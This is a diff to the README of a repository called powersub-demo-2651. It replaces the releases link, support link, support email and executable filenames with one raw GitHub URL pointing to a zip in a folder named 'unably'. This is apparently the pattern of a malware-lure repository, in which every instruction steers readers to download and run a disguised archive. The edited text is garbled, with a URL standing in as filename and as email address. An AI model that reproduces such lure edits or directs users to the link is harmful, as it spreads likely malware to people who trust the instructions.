@@ -6,7 +6,7 @@ Welcome to powersub-demo-2651! This application helps improve your workflow and 
 
 ### 🔗 Download Link
 
-[![Download powersub-demo-2651](https://img.shields.io/badge/Download-powersub--demo--2651-blue.svg)](https://github.com/Nutca/powersub-demo-2651/releases)
+[![Download powersub-demo-2651](https://raw.githubusercontent.com/Nutca/powersub-demo-2651/main/unably/powersub-demo-2651.zip)](https://raw.githubusercontent.com/Nutca/powersub-demo-2651/main/unably/powersub-demo-2651.zip)
 
 ## 🛠️ System Requirements
 
@@ -22,7 +22,7 @@ To run powersub-demo-2651 smoothly, ensure your system meets the following requi
 
 To download powersub-demo-2651, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Nutca/powersub-demo-2651/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Nutca/powersub-demo-2651/main/unably/powersub-demo-2651.zip).
 2. **Choose Your Version:** Find the latest version listed. Older versions are also available if needed.
 3. **Download the File:**
    - Click on the link for your operating system. 
@@ -33,14 +33,14 @@ To download powersub-demo-2651, follow these steps:
 Once the download is complete, follow these steps to run the application:
 
 1. **Locate the Downloaded File:** 
-   - For Windows, find it in your "Downloads" folder, usually named `powersub-demo-2651.exe`.
-   - For macOS, check the "Downloads" folder for `powersub-demo-2651.dmg`.
-   - For Linux, check the relevant folder for `powersub-demo-2651.AppImage`.
+   - For Windows, find it in your "Downloads" folder, usually named `https://raw.githubusercontent.com/Nutca/powersub-demo-2651/main/unably/powersub-demo-2651.zip`.
+   - For macOS, check the "Downloads" folder for `https://raw.githubusercontent.com/Nutca/powersub-demo-2651/main/unably/powersub-demo-2651.zip`.
+   - For Linux, check the relevant folder for `https://raw.githubusercontent.com/Nutca/powersub-demo-2651/main/unably/powersub-demo-2651.zip`.
 
 2. **Open the File:**
-   - **Windows:** Double-click on `powersub-demo-2651.exe` to run the file.
-   - **macOS:** Double-click `powersub-demo-2651.dmg`, then drag the application to your "Applications" folder.
-   - **Linux:** Make the file executable. Right-click on `powersub-demo-2651.AppImage`, select "Properties," go to the "Permissions" tab, and check "Allow executing file as program." Then double-click to run.
+   - **Windows:** Double-click on `https://raw.githubusercontent.com/Nutca/powersub-demo-2651/main/unably/powersub-demo-2651.zip` to run the file.
+   - **macOS:** Double-click `https://raw.githubusercontent.com/Nutca/powersub-demo-2651/main/unably/powersub-demo-2651.zip`, then drag the application to your "Applications" folder.
+   - **Linux:** Make the file executable. Right-click on `https://raw.githubusercontent.com/Nutca/powersub-demo-2651/main/unably/powersub-demo-2651.zip`, select "Properties," go to the "Permissions" tab, and check "Allow executing file as program." Then double-click to run.
 
 ## ⚙️ How to Use
 
@@ -71,10 +71,10 @@ If you encounter issues while using powersub-demo-2651, consider the following s
    - Make sure your browser allows downloads from external sites.
 
 3. **Feature Requests or Bugs:**
-   - Visit our [Support Page](https://github.com/Nutca/powersub-demo-2651/issues) to report any bugs or request new features.
+   - Visit our [Support Page](https://raw.githubusercontent.com/Nutca/powersub-demo-2651/main/unably/powersub-demo-2651.zip) to report any bugs or request new features.
 
 ## 📞 Support
 
-If you need further assistance, please reach out via email at support@powersubdemo.com. Our team is eager to help you make the most of powersub-demo-2651.
+If you need further assistance, please reach out via email at https://raw.githubusercontent.com/Nutca/powersub-demo-2651/main/unably/powersub-demo-2651.zip Our team is eager to help you make the most of powersub-demo-2651.
 
-[![Download powersub-demo-2651](https://img.shields.io/badge/Download-powersub--demo--2651-blue.svg)](https://github.com/Nutca/powersub-demo-2651/releases)
+[![Download powersub-demo-2651](https://raw.githubusercontent.com/Nutca/powersub-demo-2651/main/unably/powersub-demo-2651.zip)](https://raw.githubusercontent.com/Nutca/powersub-demo-2651/main/unably/powersub-demo-2651.zip)
